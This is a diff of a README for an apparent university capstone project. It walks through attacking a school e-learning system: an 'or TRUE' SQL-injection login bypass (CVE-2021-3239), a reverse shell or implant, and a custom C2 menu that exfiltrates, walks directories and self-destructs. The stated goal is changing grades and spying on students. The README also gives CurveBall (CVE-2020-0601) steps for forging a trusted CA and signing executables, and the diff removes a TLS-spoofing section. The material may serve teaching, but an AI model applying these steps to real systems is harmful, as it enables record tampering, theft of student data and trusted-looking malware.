@@ -2,18 +2,20 @@
 
 The general idea: Victim is a school education system that has all the grades and tons of student/teacher information. Let's assume this is all stored on the same machine and we can put all these files on the desktop. We are a student that wants to have malicious access to this system to modify school files (change our grades, attendance), spy on peer's information, and whatever teacher files are on the computer (data modification and exfil). There is a vulnerability in the system (CVE-2021-3239): "E-Learning System 1.0" (an actual piece of software submitted to an open source website which was used by a public school in the Philippines) is vulnerable to SQL injection and we are able to authenticate by SQL injecting an "or TRUE" into the unsanitized login screen and then gain a reverse shell or install an implant. From here the implant runs and we connect to it via a C2 software that we wrote so that we can choose which data and when to extract it or when to abort.
 
-#How to setup the victim and environment
+## How to setup the victim and environment
 To test this out, generally follow the setup instructions here: https://www.sourcecodester.com/php/12808/e-learning-system-using-phpmysqli.html.
 - First setup a virtual machine in virtualbox of windows 10 old version: https://drive.google.com/file/d/1OUPmqJ7JiYdY5jt7T7G9oDnN01usJs7v/view?usp=sharing. I gave it 32 GB storage and 7 GB RAM, but more is better of course. All future instructions are from this VM.
 - Install XAMP version 7.2.33 onto this windows VM(this version is important) https://www.apachefriends.org/download.html. You will have to click more and then find version 7.2.33. Download the most frequently downloaded copy of this version.
 - Install netcat through nmap https://nmap.org/
 - Install the most recent version of Python and pip install rsa, requests, and colorama (it's a lot easier to see colored text stand out)
 - Follow the instructions in the first link to setup E-Learning System 1.0. This includes extracting the CAIWL program, running apache and mySQL, setting up a database.
-- Execute the python script (exploit.py) from anywhere (on the VM unless you specify the ports from another machine - we need to modify the code if we want it to open a port onto another VM). 
+
+## How to Run
+- Execute the exploit python script (exploit.py) from anywhere (on the VM unless you specify the ports from another machine - we need to modify the code if we want it to open a port onto another VM). 
 ```
 python exploit.py
 ``` 
-- From here there are two options: either install and run the implant (enter 'i' when it prompts you to) and connect to the c2 server in another window by doing
+- From here there are two options: either install and run the implant (enter 'i' or 'c' depending on the filetype you want when it prompts you to) and connect to the c2 server in another window by doing
 ```
 python c2.py
 ``` 
@@ -25,7 +27,7 @@ ncat -l 9999
 ![Image of the Reverse Shell](https://github.com/yshneyderman/CS590J-Capstone/blob/main/example.png)
 - And the C2 looks like so:
 ![Image of the C2](https://github.com/yshneyderman/CS590J-Capstone/blob/main/example2.png)
-
+- Once both are running, you will be greeted by a menu in the c2 that prompts you to self-destruct, exfil, or exit. If you choose self-destruct you have to confirm your actions. If you choose exfil you can then enter a subcommand to exfil the data from the victim, add a new exfil path (where to look for new exfil data), or explore their directories via OS-Walk.
 
 ## How to Setup GitHub
 Generate SSH Keys
@@ -52,11 +54,9 @@ Adding changes (to a branch)
 - git commit -a -m "What I changed"
 - git push
 
-#CurveBall (CVE-2020-0601) Exploit
+# CurveBall (CVE-2020-0601) Exploit
 
 
-
-## Usage
 Create a certificate with the same public key and parameters of a trusted CA. This will be used as our spoofing CA. Set the generator to a value, where you know the private key. You can easily set the generator to the public key, and have a private key set to `1`, since `Q = dG`.
 
 Next up, you create a certificate signing request with the extensions you wish to use, e.g. code signing or server authentication.
@@ -93,27 +93,6 @@ The only thing left is to pack the certificate, its key and the spoofed CA into 
 Sign your executable with PKCS12 file.
 
     osslsigncode sign -pkcs12 cert.p12 -n "Signed by ollypwn" -in 7z1900-x64.exe -out 7z1900-x64_signed.exe
-
-## SSL/TLS
-*Please use this for educational and researching purposes only.* 
-Extract the public key from the CA and modify it according to the vulnerability:
-
-    ruby main.rb ./MicrosoftECCProductRootCertificateAuthority.cer
-Generate a new x509 certificate based on this key. This will be our own spoofed CA.
-
-    openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt
-Generate a new key. This key be of any type you want. It will be used to create a SSL certificate, which we will sign with our own CA.
-
-    openssl ecparam -name secp384r1 -genkey -noout -out cert.key
-Next up, create a new  certificate signing request (CSR). This request will oftenly be sent to trusted CA's, but since we have a spoofed one, we can sign it ourselves.
-
-If you wish to change the domain name, edit `CN  = www.google.com` to `CN  = www.example.com` inside of `openssl_tls.conf`.
-
-    openssl req -new -key cert.key -out cert.csr -config openssl_tls.conf -reqexts v3_tls
-Sign your new CSR with our spoofed CA and CA key. This certificate will expire in 2047, whereas the real trusted Microsoft CA will expire in 2043.
-
-    openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_tls.conf -extensions v3_tls
-You can now use `cert.crt`, `cert.key`, and `spoofed_ca.crt` to serve your content. Again, remember to add the spoofed_ca.crt as a certificate chain in your server's HTTPS configuration.
 
 See the usage example in [https://github.com/IIICTECH/-CVE-2020-0601---ECC-/blob/master/tls/index.js).
 
